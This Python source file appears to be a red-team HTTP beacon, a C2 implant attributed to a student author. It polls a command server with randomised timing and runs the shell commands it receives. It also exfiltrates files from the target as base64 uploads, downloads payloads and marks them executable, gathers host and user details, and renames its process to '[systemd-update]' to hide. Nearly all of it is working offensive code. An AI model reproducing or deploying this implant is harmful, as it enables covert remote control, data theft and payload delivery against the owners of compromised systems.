#!/usr/bin/env python3
"""
HTTP Beacon - Enhanced Callback Tool for Red Team Operations
Author: Arshia Aggarwal aa9779@rit.edu

Enhanced features:
- Command execution with output capture
- File upload to C2 server (exfiltrate files from target)
- File download from C2 server (drop payloads on target)
- System information gathering
- Process name obfuscation for stealth
"""

import requests
import subprocess
import time
import random
import socket
import json
import sys
import os
import base64
import platform

class Beacon:
    def __init__(self, c2_url, beacon_id, check_in_interval=30):
        """
        Initialize the beacon
        
        Args:
            c2_url: URL of C2 server (e.g., 'http://192.168.1.100:8080')
            beacon_id: Unique identifier for this beacon
            check_in_interval: Base seconds between check-ins
        """
        self.c2_url = c2_url
        self.beacon_id = beacon_id
        self.check_in_interval = check_in_interval
        
    def get_system_info(self):
        """
        Gather system information for initial beacon registration
        
        Returns:
            Dictionary of system information
        """
        try:
            return {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
                'cwd': os.getcwd(),
                'pid': os.getpid()
            }
        except Exception as e:
            return {'error': str(e)}
    
    def execute_command(self, command):
        """
        Execute a shell command and return output
        
        Args:
            command: Command string to execute
            
        Returns:
            String output from command
        """
        try:
            # Execute command
            result = subprocess.run(
                ['/bin/bash', '-c', command],
                capture_output=True,
                text=True,
                timeout=30  # Don't hang forever
            )
            
            # Combine stdout and stderr
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]:\n{result.stderr}"
            
            # Include return code
            output += f"\n[Return Code: {result.returncode}]"
                
            return output if output.strip() else "[No output]"
            
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out after 30 seconds"
        except Exception as e:
            return f"[ERROR] Command execution failed: {str(e)}"
    
    def upload_file(self, filepath):
        """
        Upload a file from target to C2 server (exfiltration)
        
        Args:
            filepath: Path to file on target system
            
        Returns:
            Success/failure message
        """
        try:
            if not os.path.exists(filepath):
                return f"[ERROR] File not found: {filepath}"
            
            # Read file and encode as base64
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Get file info
            file_info = {
                'filename': os.path.basename(filepath),
                'filepath': filepath,
                'size': os.path.getsize(filepath),
                'data': file_data
            }
            
            # Send to C2
            url = f"{self.c2_url}/upload/{self.beacon_id}"
            response = requests.post(url, json=file_info, timeout=30)
            
            if response.status_code == 200:
                return f"[SUCCESS] Uploaded {filepath} ({file_info['size']} bytes)"
            else:
                return f"[ERROR] Upload failed with status {response.status_code}"
                
        except Exception as e:
            return f"[ERROR] Upload failed: {str(e)}"
    
    def download_file(self, filename, destination):
        """
        Download a file from C2 server to target (payload drop)
        
        Args:
            filename: Name of file on C2 server
            destination: Where to save on target system
            
        Returns:
            Success/failure message
        """
        try:
            # Request file from C2
            url = f"{self.c2_url}/download/{filename}"
            response = requests.get(url, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                # Decode base64 data
                file_data = base64.b64decode(data['data'])
                
                # Write to destination
                with open(destination, 'wb') as f:
                    f.write(file_data)
                
                # Make executable if it's a script
                if destination.endswith(('.sh', '.py')):
                    os.chmod(destination, 0o755)
                
                return f"[SUCCESS] Downloaded {filename} to {destination} ({len(file_data)} bytes)"
            else:
                return f"[ERROR] Download failed: {response.status_code}"
                
        except Exception as e:
            return f"[ERROR] Download failed: {str(e)}"
    
    def check_in(self):
        """
        Check in with C2 server to see if there are commands
        
        Returns:
            Dictionary with command type and data, or None
        """
        try:
            url = f"{self.c2_url}/checkin/{self.beacon_id}"
            
            # Include system info in check-in
            sys_info = self.get_system_info()
            response = requests.post(url, json=sys_info, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                return data if data.get('command') else None
            else:
                print(f"[ERROR] Check-in failed with status {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Failed to check in: {str(e)}")
            return None
    
    def send_results(self, output):
        """
        Send command results back to C2 server
        
        Args:
            output: Command output string to send
        """
        try:
            url = f"{self.c2_url}/results/{self.beacon_id}"
            data = {'output': output}
            response = requests.post(url, json=data, timeout=10)
            
            if response.status_code != 200:
                print(f"[ERROR] Failed to send results: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Failed to send results: {str(e)}")
    
    def add_jitter(self):
        """
        Add random jitter to check-in interval for stealth
        
        Returns:
            Sleep time in seconds with jitter applied
        """
        # Add ±30% random jitter
        jitter_range = int(self.check_in_interval * 0.3)
        jitter = random.randint(-jitter_range, jitter_range)
        return self.check_in_interval + jitter
    
    def handle_command(self, cmd_data):
        """
        Handle different command types from C2
        
        Args:
            cmd_data: Dictionary containing command type and parameters
            
        Returns:
            Output/result string
        """
        cmd_type = cmd_data.get('type', 'shell')
        
        if cmd_type == 'shell':
            # Execute shell command
            command = cmd_data.get('command')
            return self.execute_command(command)
            
        elif cmd_type == 'upload':
            # Upload file to C2
            filepath = cmd_data.get('filepath')
            return self.upload_file(filepath)
            
        elif cmd_type == 'download':
            # Download file from C2
            filename = cmd_data.get('filename')
            destination = cmd_data.get('destination', f'/tmp/{filename}')
            return self.download_file(filename, destination)
            
        elif cmd_type == 'sysinfo':
            # Return detailed system info
            info = self.get_system_info()
            return json.dumps(info, indent=2)
            
        else:
            return f"[ERROR] Unknown command type: {cmd_type}"
    
    def run(self):
        """
        Main beacon loop - check in, execute commands, send results
        """
        print(f"[*] Beacon {self.beacon_id} starting...")
        print(f"[*] C2 Server: {self.c2_url}")
        print(f"[*] Check-in interval: ~{self.check_in_interval}s (with jitter)")
        print(f"[*] Starting beacon loop...\n")
        
        while True:
            try:
                # Check in with C2
                cmd_data = self.check_in()
                
                # Did we get a command?
                if cmd_data and cmd_data.get('command'):
                    print(f"[*] Received command: {cmd_data}")
                    
                    # Special command: exit beacon
                    if cmd_data.get('command') == 'exit':
                        print("[*] Exit command received. Shutting down beacon.")
                        self.send_results("[*] Beacon exiting gracefully")
                        break
                    
                    # Handle the command
                    output = self.handle_command(cmd_data)
                    print(f"[*] Command executed. Sending results...")
                    
                    # Send results back
                    self.send_results(output)
                    print(f"[*] Results sent.\n")
                else:
                    print(f"[*] No commands. Sleeping...")
                
                # Sleep with jitter before next check-in
                sleep_time = self.add_jitter()
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print("\n[*] Beacon interrupted by user. Exiting.")
                break
            except Exception as e:
                print(f"[ERROR] Unexpected error in beacon loop: {str(e)}")
                print("[*] Sleeping before retry...")
                time.sleep(60)  # Wait a bit before retrying

def load_config():
    """Load configuration from config.json if it exists"""
    if os.path.exists('config.json'):
        with open('config.json', 'r') as f:
            return json.load(f)
    return None

def main():
    """
    Main entry point - configure and start beacon
    """
    # STEALTH: Rename process to look like system service
    sys.argv[0] = '[systemd-update]'
    
    # Try to load config file
    config = load_config()
    
    if config:
        C2_URL = config.get('c2_url', 'http://127.0.0.1:8080')
        CHECK_IN_INTERVAL = config.get('check_in_interval', 30)
    else:
        # Default configuration
        C2_URL = "http://127.0.0.1:8080"
        CHECK_IN_INTERVAL = 30
    
    BEACON_ID = f"beacon-{socket.gethostname()}"
    
    # Create and run beacon
    beacon = Beacon(C2_URL, BEACON_ID, CHECK_IN_INTERVAL)
    beacon.run()

if __name__ == '__main__':
    main()